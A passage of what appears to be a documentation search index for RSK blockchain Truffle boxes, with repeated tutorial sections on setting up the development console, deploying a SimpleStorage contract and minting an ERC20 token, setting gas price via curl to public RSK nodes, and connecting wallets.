be included in that block. To update the minimumGasPrice in our project run this query using cURL: Testnet curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-testnet.json Mainnet curl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-mainnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json or .minimum-gas-price-mainnet.json, respectively. In the truffle-config.js , we are reading the parameter minimumGasPrice in each json file. For more information about the Gas and minimumGasPrice please go to the gas page . Connect to RSK \u00b6 Copy your mnemonic to truffle-config.js //Put your mnemonic here, be careful not to deploy your mnemonic into production! const mnemonic = 'A_MNEMONIC' ; Please be aware that we are using HDWalletProvider with RSK Networks derivations path: - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 For more information check RSKIP57 . Run the development console for any RSK network. # Console for Testnet truffle console --network testnet # Console for Mainnet truffle console --network mainnet Migrate the smart contracts. We will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative. truffle migrate 4. Update express JS component. The express server uses the web3.js library to interact with the blockchain - writing code that reads and writes data from the blockchain with smart contracts. Choose which RSK network you would like to connect the server to and update line 11 of the file app/src/server/index.js Testnet const provider = new Web3 . providers . HttpProvider ( \"https://public-node.testnet.rsk.co\" ); Mainnet const provider = new Web3 . providers . HttpProvider ( \"https://public-node.rsk.co\" ); In a terminal, go to the app directory and run the app. For example, this command will run the production server: cd app npm start Then go to your browser at http://localhost:8080/ Note that when you are connected to an RSK network, you do not need to leave open the Truffle console, because the app is connected via a public node, directly to the network. Next steps \u00b6 Go to tutorial Go to the tutorial using rsk-react-express-box to learn more about this project. We covered all the steps with more details, explanations, and images. Find more documentation Check out the RSK developers portal . Do you have questions? Ask in the RSK chat .", "title": "RSK React + Express JS Box"}, {"location": "boxes/rsk-react-express-box/#rsk-react-express-js-box", "text": "This box comes with everything you need to start using express JS to provide API endpoints to smart contracts and a react app to interact with them on RSK Blockchain . It includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy.", "title": "RSK React + Express JS Box"}, {"location": "boxes/rsk-react-express-box/#requirements", "text": "NPM (Node Package Manager) and Node.js are needed, though both are usually installed at once. Go to Node.js if you need to install it. Truffle Install Truffle globally: npm install -g truffle", "title": "Requirements"}, {"location": "boxes/rsk-react-express-box/#installation", "text": "Create a new folder. For example, create the folder rsk-react-express . Navigate to the folder in the terminal. mkdir rsk-react-express cd rsk-react-express Run the unbox command. It can take some time, as this will install all necessary dependencies. truffle unbox rsksmart/rsk-react-express-box A client-server application is generated in the app directory. This is the result using Windows OS:", "title": "Installation"}, {"location": "boxes/rsk-react-express-box/#development-console", "text": "Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop REPL with seeded accounts and their associated private keys listed. C:\\RSK\\rsk-next>truffle develop Truffle Develop started at http://127.0.0.1:8545/ Accounts: (0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728 (1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c (2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe (3) 0x9576d0a496b645baa64f22aceb2328e7468d4113 (4) 0xd431572eef7d77584d944c1809398a155e89f830 (5) 0x92c111839718fe0800fadccc67068b40b8524a0f (6) 0x6da22b5a027146619bfe6704957f7f36ff029c48 (7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867 (8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7 (9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b Private Keys: (0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167 (1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3 (2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde (3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e (4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b (5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847 (6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db (7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb (8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e (9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63 Mnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(develop)> Take a look at the smart contract SimpleStorage.sol . You can check it out in folder contracts . This smart contract has: A variable storedData to store a number A function get() to return the number stored at variable storedData A function set() to change the number stored at variable storedData Compile and migrate the smart contract. Note, inside the development console we don't preface commands with truffle . To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: migrate And the migrate output should be similar to: Running contract tests. This Truffle box also comes with the file TestSimpleStorage.js for testing the smart contract. You can check it out in the test folder. Run this command in the development console: test This test output should be similar to: Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console. truffle test", "title": "Development console"}, {"location": "boxes/rsk-react-express-box/#the-application", "text": "Our box is a client-server: - Server uses express JS to interact with the smart contract. - Client uses react app. Running in development mode In another terminal (i.e. not in the truffle develop prompt), go to the app directory and run the app in development mode. Do not close the other terminal, which is running the Truffle development console, because it is our Blockchain simulator. If you close it and then open it again, you need to deploy / migrate the smart contract again too! cd app npm run dev This command executes server and client applications and you can access it in your browser: Server: http://localhost:8080/ Client: http://localhost:3000/ Smart contract changes must be manually recompiled and migrated! NOTE : This box is the starting point for the RSK tutorial using rsk-react-express-box . Running the production server You can choose to run only the production server. In another terminal (i.e. not in the truffle develop prompt), go to the app directory and run the app in production mode. cd app npm start If you have yarn installed, you can use yarn start . Then go to your browser at http://localhost:8080/ When you are running only the production server, for any change you need to stop and run the server again for the updates to take effect! To build the application for production, use the build script in the app folder. A production build will be in the app/dist folder. npm run build Take a look in the app/dist folder:", "title": "The application"}, {"location": "boxes/rsk-react-express-box/#using-rsk-networks", "text": "This Truffle box is already configured to connect to both RSK networks: testnet and mainnet. We need only to update few items: Setup an account & get R-BTC RSK network gas price Your wallet mnemonic Choose the network in the app", "title": "Using RSK networks"}, {"location": "boxes/rsk-react-express-box/#setup-an-account-get-r-btc", "text": "Get an address, learning how works the account based RSK addresses . For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange .", "title": "Setup an account &amp; get R-BTC"}, {"location": "boxes/rsk-react-express-box/#setup-the-gas-price", "text": "Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the minimumGasPrice in our project run this query using cURL: Testnet curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-testnet.json Mainnet curl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-mainnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json or .minimum-gas-price-mainnet.json, respectively. In the truffle-config.js , we are reading the parameter minimumGasPrice in each json file. For more information about the Gas and minimumGasPrice please go to the gas page .", "title": "Setup the gas price"}, {"location": "boxes/rsk-react-express-box/#connect-to-rsk", "text": "Copy your mnemonic to truffle-config.js //Put your mnemonic here, be careful not to deploy your mnemonic into production! const mnemonic = 'A_MNEMONIC' ; Please be aware that we are using HDWalletProvider with RSK Networks derivations path: - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 For more information check RSKIP57 . Run the development console for any RSK network. # Console for Testnet truffle console --network testnet # Console for Mainnet truffle console --network mainnet Migrate the smart contracts. We will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative. truffle migrate 4. Update express JS component. The express server uses the web3.js library to interact with the blockchain - writing code that reads and writes data from the blockchain with smart contracts. Choose which RSK network you would like to connect the server to and update line 11 of the file app/src/server/index.js Testnet const provider = new Web3 . providers . HttpProvider ( \"https://public-node.testnet.rsk.co\" ); Mainnet const provider = new Web3 . providers . HttpProvider ( \"https://public-node.rsk.co\" ); In a terminal, go to the app directory and run the app. For example, this command will run the production server: cd app npm start Then go to your browser at http://localhost:8080/ Note that when you are connected to an RSK network, you do not need to leave open the Truffle console, because the app is connected via a public node, directly to the network.", "title": "Connect to RSK"}, {"location": "boxes/rsk-react-express-box/#next-steps", "text": "Go to tutorial Go to the tutorial using rsk-react-express-box to learn more about this project. We covered all the steps with more details, explanations, and images. Find more documentation Check out the RSK developers portal . Do you have questions? Ask in the RSK chat .", "title": "Next steps"}, {"location": "boxes/rsk-starter-box/", "text": "RSK Truffle Starter Box \u00b6 This box comes with everything you need to start using Truffle on RSK Blockchain . It includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy. RSK is an open source platform for Ethereum compatible smart contracts based on the Bitcoin network. Requirements \u00b6 NPM (Node Package Manager) Node.js and NPM are needed, though both are usually installed at once. Go to Node.js if you need to install it. Truffle Install Truffle globally npm install -g truffle Installation \u00b6 Create a new folder. For example, create the folder rsk-starter . Navigate to the folder in the terminal. mkdir rsk-starter cd rsk-starter Run the unbox command. It can take some time, as this will install all necessary dependencies. truffle unbox rsksmart/rsk-starter-box This is the result using Windows OS: Development console \u00b6 Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop REPL with seeded accounts and their associated private keys listed. Truffle Develop started at http://127.0.0.1:9545/ Accounts: (0) 0x4579996629f631d5221c9ea0c3552f6dcff61e9e (1) 0x52f43fccc4ffcbb9f0a57320401139ef4088093f (2) 0xea7e59d8403587bdb1c12758eb33f82dc9e0a451 (3) 0x9eed1b59ac18360b67b7ef2a069f8c35ad62b009 (4) 0x064874a46fc29fd15736cc0c890276fe1dfb9ecc (5) 0x2c612c461690ab601977595028ba1ed62e98d605 (6) 0x50a317d18a78e4ad8491c0696582da35ba30b12a (7) 0xdf68b82ac51d21c731b8aa3c9c1d65c62ffb1b75 (8) 0x018c7c87900304eeff2f852def58776b920b9da2 (9) 0xdc2fe4385c54349c0303e448333a5de1131bc88e Private Keys: (0) 0895ef2194a15575ac9e75c5c837853637af444442f7b64dcea60029e68df5f6 (1) 1ca9f748b4d92ca6b9ffcc4f0027a17189871f250666fa20c08bc901a6757174 (2) 97e256de57f8206741223fe20953d047429b85f8a0ed5ec00a459cbf6e5859c4 (3) 7dc0ba635a4fe0af8be559446f34be036bc2aa055a34d81337601ba929b1892c (4) c2dc9ba56f683ba2090de3932ab991f60c6e08535d2a8ffcc4c3ddea4b9be2f8 (5) e4943ce248e556559f5b5e0cc097215a440ca2dafcaddef9fbad79bef58e028d (6) fbe436944b525e468209299b0e35f93a287bc0c25411418f10a9c2292ccbca8f (7) 0381515a5f83c9c97683a370383f45a4d2c8de61299d8a0e03c2313a5ace2457 (8) ed39e1a942bf3c48c744bd5282410c811c56dbbec2bd133d09c43cd005a31e7b (9) 2dd9fbe98b5a4bad9f619e260f99db699d5b80b3081c0bc283647b576e44b89a Mnemonic: butter mention wealth vicious fancy plastic treat title filter excess witness bus \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. Take a look at the smart contract SimpleStorage.sol . You can check it out in folder contracts . This smart contract has: A variable storedData to store a number A function get() to return the number stored at variable storedData A function set() to change the number stored at variable storedData Compile and migrate the smart contract. Note inside the development console we don't preface commands with truffle. To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: migrate And the migrate output should be similar to: Running contract tests. Our box also comes with the file TestSimpleStorage.js for testing the smart contract. You can check it out in the test folder. Run this command in the development console: test This test output should be similar to: NOTE : This box is the starting point for the RSK tutorial Using rsk-starter-box . Using RSK networks \u00b6 Truffle makes developing on RSK easier because we can configure custom networks for RSK. The networks are already configured in the truffle-config.js file. Setup an account & get R-BTC \u00b6 Get an address using these instructions . For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange . Take a look truffle-config.js file to realize that we are using HDWalletProvider with RSK Networks derivations path: - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 For more information check RSKIP57 . Update your mnemonic \u00b6 Paste the wallet mnemonic in the file .secret , located in the folder project, and save it. Setup the gas price \u00b6 Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the minimumGasPrice in our project run this query using cURL: Testnet curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-testnet.json Mainnet curl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-mainnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json or .minimum-gas-price-mainnet.json, respectively. In the truffle-config.js , we are reading the parameter minimumGasPrice in each json file. For more information about the Gas and minimumGasPrice please go here . Connect to RSK network \u00b6 Run the truffle console for any RSK network. # Console for Mainnet truffle console --network mainnet # Console forn Testnet truffle console --network testnet Compile and migrate the smart contracts \u00b6 We will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative. On any of the networks, run this commands in a terminal (not in Truffle console): truffle compile truffle migrate Next steps \u00b6 Go to tutorial Go to the tutorial Using rsk-starter-box to learn how to interact with SimpleStorage.sol . Also, we covered all the steps with more details, explanations, and images. Find more documentation Check out the RSK developers portal . Do you have questions? Ask in RSK chat .", "title": "RSK Truffle Starter Box"}, {"location": "boxes/rsk-starter-box/#rsk-truffle-starter-box", "text": "This box comes with everything you need to start using Truffle on RSK Blockchain . It includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy. RSK is an open source platform for Ethereum compatible smart contracts based on the Bitcoin network.", "title": "RSK Truffle Starter Box"}, {"location": "boxes/rsk-starter-box/#requirements", "text": "NPM (Node Package Manager) Node.js and NPM are needed, though both are usually installed at once. Go to Node.js if you need to install it. Truffle Install Truffle globally npm install -g truffle", "title": "Requirements"}, {"location": "boxes/rsk-starter-box/#installation", "text": "Create a new folder. For example, create the folder rsk-starter . Navigate to the folder in the terminal. mkdir rsk-starter cd rsk-starter Run the unbox command. It can take some time, as this will install all necessary dependencies. truffle unbox rsksmart/rsk-starter-box This is the result using Windows OS:", "title": "Installation"}, {"location": "boxes/rsk-starter-box/#development-console", "text": "Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop REPL with seeded accounts and their associated private keys listed. Truffle Develop started at http://127.0.0.1:9545/ Accounts: (0) 0x4579996629f631d5221c9ea0c3552f6dcff61e9e (1) 0x52f43fccc4ffcbb9f0a57320401139ef4088093f (2) 0xea7e59d8403587bdb1c12758eb33f82dc9e0a451 (3) 0x9eed1b59ac18360b67b7ef2a069f8c35ad62b009 (4) 0x064874a46fc29fd15736cc0c890276fe1dfb9ecc (5) 0x2c612c461690ab601977595028ba1ed62e98d605 (6) 0x50a317d18a78e4ad8491c0696582da35ba30b12a (7) 0xdf68b82ac51d21c731b8aa3c9c1d65c62ffb1b75 (8) 0x018c7c87900304eeff2f852def58776b920b9da2 (9) 0xdc2fe4385c54349c0303e448333a5de1131bc88e Private Keys: (0) 0895ef2194a15575ac9e75c5c837853637af444442f7b64dcea60029e68df5f6 (1) 1ca9f748b4d92ca6b9ffcc4f0027a17189871f250666fa20c08bc901a6757174 (2) 97e256de57f8206741223fe20953d047429b85f8a0ed5ec00a459cbf6e5859c4 (3) 7dc0ba635a4fe0af8be559446f34be036bc2aa055a34d81337601ba929b1892c (4) c2dc9ba56f683ba2090de3932ab991f60c6e08535d2a8ffcc4c3ddea4b9be2f8 (5) e4943ce248e556559f5b5e0cc097215a440ca2dafcaddef9fbad79bef58e028d (6) fbe436944b525e468209299b0e35f93a287bc0c25411418f10a9c2292ccbca8f (7) 0381515a5f83c9c97683a370383f45a4d2c8de61299d8a0e03c2313a5ace2457 (8) ed39e1a942bf3c48c744bd5282410c811c56dbbec2bd133d09c43cd005a31e7b (9) 2dd9fbe98b5a4bad9f619e260f99db699d5b80b3081c0bc283647b576e44b89a Mnemonic: butter mention wealth vicious fancy plastic treat title filter excess witness bus \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. Take a look at the smart contract SimpleStorage.sol . You can check it out in folder contracts . This smart contract has: A variable storedData to store a number A function get() to return the number stored at variable storedData A function set() to change the number stored at variable storedData Compile and migrate the smart contract. Note inside the development console we don't preface commands with truffle. To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: migrate And the migrate output should be similar to: Running contract tests. Our box also comes with the file TestSimpleStorage.js for testing the smart contract. You can check it out in the test folder. Run this command in the development console: test This test output should be similar to: NOTE : This box is the starting point for the RSK tutorial Using rsk-starter-box .", "title": "Development console"}, {"location": "boxes/rsk-starter-box/#using-rsk-networks", "text": "Truffle makes developing on RSK easier because we can configure custom networks for RSK. The networks are already configured in the truffle-config.js file.", "title": "Using RSK networks"}, {"location": "boxes/rsk-starter-box/#setup-an-account-get-r-btc", "text": "Get an address using these instructions . For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange . Take a look truffle-config.js file to realize that we are using HDWalletProvider with RSK Networks derivations path: - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 For more information check RSKIP57 .", "title": "Setup an account &amp; get R-BTC"}, {"location": "boxes/rsk-starter-box/#update-your-mnemonic", "text": "Paste the wallet mnemonic in the file .secret , located in the folder project, and save it.", "title": "Update your mnemonic"}, {"location": "boxes/rsk-starter-box/#setup-the-gas-price", "text": "Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the minimumGasPrice in our project run this query using cURL: Testnet curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-testnet.json Mainnet curl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-mainnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json or .minimum-gas-price-mainnet.json, respectively. In the truffle-config.js , we are reading the parameter minimumGasPrice in each json file. For more information about the Gas and minimumGasPrice please go here .", "title": "Setup the gas price"}, {"location": "boxes/rsk-starter-box/#connect-to-rsk-network", "text": "Run the truffle console for any RSK network. # Console for Mainnet truffle console --network mainnet # Console forn Testnet truffle console --network testnet", "title": "Connect to RSK network"}, {"location": "boxes/rsk-starter-box/#compile-and-migrate-the-smart-contracts", "text": "We will do it running the below commands directly in the terminal, without using the truffle console, this is to show you an alternative. On any of the networks, run this commands in a terminal (not in Truffle console): truffle compile truffle migrate", "title": "Compile and migrate the smart contracts"}, {"location": "boxes/rsk-starter-box/#next-steps", "text": "Go to tutorial Go to the tutorial Using rsk-starter-box to learn how to interact with SimpleStorage.sol . Also, we covered all the steps with more details, explanations, and images. Find more documentation Check out the RSK developers portal . Do you have questions? Ask in RSK chat .", "title": "Next steps"}, {"location": "boxes/rsk-token-box/", "text": "RSK Truffle Token Box \u00b6 Truffle box with everything you need to start creating a token using Open Zeppelin smart contracts library in Truffle framework, connected to a RSK network. It includes network configurations for local node (regtest), Testnet and Mainnet. Requirements \u00b6 There are a few technical requirements before we start. To use Truffle boxes , you need to have installed in your computer: Git a POSIX compliant shell cURL Node.js and NPM a code editor If you don't have any of them installed, go to the tutorial Truffle boxes prerequisites which have all the instructions to setup these requirements. Truffle framework Once you have those requirements installed, you only need one command to install Truffle . It is better to do it globally: npm install -g truffle Installation \u00b6 Create a new folder. For example, create the folder rsk-token . Navigate to the folder in the terminal. mkdir rsk-token cd rsk-token Run the unbox command. This also takes care of installing the necessary dependencies and it can take some time. truffle unbox rsksmart/rsk-token-box This is the result using Windows OS: Development console \u00b6 Truffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now truffle(develop)> truffle develop You will now be in the truffle develop console with seeded accounts and their associated private keys listed. C:\\RSK\\rsk-next>truffle develop Truffle Develop started at http://127.0.0.1:8545/ Accounts: (0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728 (1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c (2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe (3) 0x9576d0a496b645baa64f22aceb2328e7468d4113 (4) 0xd431572eef7d77584d944c1809398a155e89f830 (5) 0x92c111839718fe0800fadccc67068b40b8524a0f (6) 0x6da22b5a027146619bfe6704957f7f36ff029c48 (7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867 (8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7 (9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b Private Keys: (0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167 (1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3 (2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde (3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e (4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b (5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847 (6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db (7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb (8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e (9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63 Mnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber \u26a0\ufe0f Important \u26a0\ufe0f : This mnemonic was created for you by Truffle. It is not secure. Ensure you do not use it on production blockchains, or else you risk losing funds. truffle(develop)> Token.sol \u00b6 Take a look at the smart contract Token.sol . You can check it out in folder contracts . Token.sol has only 7 code lines! This smart contract is a mintable ERC20 token. This means that, in addition to the standard ERC20 specification, it has a function for issuing new tokens. To create our ERC20 Token, we will import ERC20Mintable from Open Zeppelin. This library itself imports several other libraries such as SafeMath.sol , the standards for this kind of token, and the capability to mint tokens. Inside the token, we define some basic information about the token: name , symbol , and number of decimals for the precision. To inherit the library's attributes and functions, we simply define our contract as a ERC20Mintable using the is keyword in this way. Compile the smart contract. Note inside the development console we don't preface commands with truffle . To make sure you're in the development console, the command prompt must be truffle(develop)> compile The compile output should be similar to: Deploy (migrate) the smart contract. migrate And the migrate output should be similar to: Running contract tests. This Truffle box also comes with the file TestToken.js which include some examples for testing the smart contract. You can check it out in the test folder. There are many other tests which can be done to check an ERC20 token. Run this command in the development console: test This test output should be similar to: Note the command varies slightly if you're in or outside of the development console. // inside the development console. test // outside the development console. truffle test Interact with the token using Truffle console \u00b6 Get your accounts in Truffle console. In the Truffle console, enter: const accounts = await web3 . eth . getAccounts () Don\u2019t worry about the undefined return, it is ok. See the addresses after it by entering the command below: accounts And to view each account: accounts [ 0 ] accounts [ 1 ] Take a look in the results: Interact with the token using Truffle console. First of all, connect with your token const token = await Token . deployed () Confirm if our instance is OK. Enter the instance\u2019s name: token , then . , without space hit the TAB button twice to trigger auto-complete as seen below. This will display the published address of the smart contract, and the transaction hash for its deployment, among other things, including all public variables and methods available. token . [ TAB ] [ TAB ] Check the total supply To check if we have tokens already minted, call the totalSupply function: ( await token . totalSupply ()). toString () The returned value is 0, which is expected, since we did not perform any initial mint when we deployed the token. Check the token balance To check the balance of an account, call the balanceOf function. For example, to check the balance of account 0: ( await token . balanceOf ( accounts [ 0 ])). toString () Take a look in the results of total supply and balanceOf: The returned value is also 0, which is expected, since we did not make any initial mint when we deployed the token, and by definition no accounts can have any tokens yet. Mint tokens Run this command: token . mint ( accounts [ 0 ], 10000 ) This command sent a transaction to mint 100 tokens for account 0. You can also mint to a specific address, 0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79 : token . mint ( \"0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79\" , 10000 ) Reconfirm the token balance Check the balance of account 0 again: ( await token . balanceOf ( accounts [ 0 ])). toString () The returned value is 10000, which is 100 with 2 decimal places of precision. This is exactly what we expected, as we issued 100 tokens Also, you can get the balance of a specific address, for example, 0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79 : ( await token . balanceOf ( \"0xa52515946DAABe072f446Cc014a4eaA93fb9Fd79\" )). toString () Take a look in the results: Check the total supply (again) Check the total supply again: ( await token . totalSupply ()). toString () The returned value is 20000, which is 200 with 2 decimal places of precision. After minting 100 tokens for 2 accounts, this is perfect! Transfer tokens To transfer 40 tokens from account 0 to account 2. This can be done by calling the transfer function. token . transfer ( accounts [ 2 ], 4000 , { from : accounts [ 0 ]}) Account 2 had no tokens before the transfer, and now it should have 40. Account 1 must have 60 tokens. Also the total supply will be the same. Let\u2019s check the balance of each account and the total supply: ( await token . balanceOf ( accounts [ 2 ])). toString () ( await token . balanceOf ( accounts [ 0 ])). toString () ( await token . totalSupply ()). toString () Take a look in the results: Great! The balances of both accounts and the total supply are correct. Exit Truffle console \u00b6 In the Truffle console, enter this command to exit the terminal: .exit Using RSK networks \u00b6 This Truffle box is already configured to connect to three RSK networks: regtest (local node) testnet mainnet Testnet will be used here. We need to do some tasks: Setup an account and get R-BTC Update RSK network gas price Connect to an RSK network Deploy in the network of your choose Setup an account & get R-BTC \u00b6 Create a wallet The easy way to setup an account is using a web3 wallet injected in the browser. Some options are: - Metamask - Nifty Select the RSK Network in the web wallet. - Nifty: select in the dropdown list - Metamask: go to RSK Testnet to configure it in Custom RPC You can learn more about account based RSK addresses . Take a look truffle-config.js file to realize that we are using HDWalletProvider with RSK Networks derivations path: - RSK Testnet dpath: m/44\u2019/37310\u2019/0\u2019/0 - RSK Mainnet dpath: m/44\u2019/137\u2019/0\u2019/0 For more information check RSKIP57 . Update .secret file After create your wallet, update your mnemonic in the file .secret , located in the folder project, and save it. Get some R-BTCs: For the RSK Testnet, get tR-BTC from our faucet . For the RSK Mainnet, get R-BTC from an exchange . Setup the gas price \u00b6 Gas is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in R-BTC . The minimumGasPrice is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block. To update the minimumGasPrice in our project run this query using cURL: Testnet curl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-testnet.json Mainnet curl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\ --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}' \\ > .minimum-gas-price-mainnet.json This query saved the details of latest block to file .minimum-gas-price-testnet.json or .minimum-gas-price-mainnet.json, respectively. In the truffle-config.js , we are reading the parameter minimumGasPrice in each json file. For more information about the Gas and minimumGasPrice please go to the gas page . Connect to RSK Testnet or Mainnet \u00b6 Run the development console for any RSK network. # Console for Testnet truffle console --network testnet # Console for Mainnet truffle console --network mainnet Test the connection to RSK network \u00b6 On any of the networks, run this commands in the Truffle console: Block number \u00b6 Shows the last block number. ( await web3 . eth . getBlockNumber ()). toString () Network ID \u00b6 To get the network ID, run this command: ( await web3 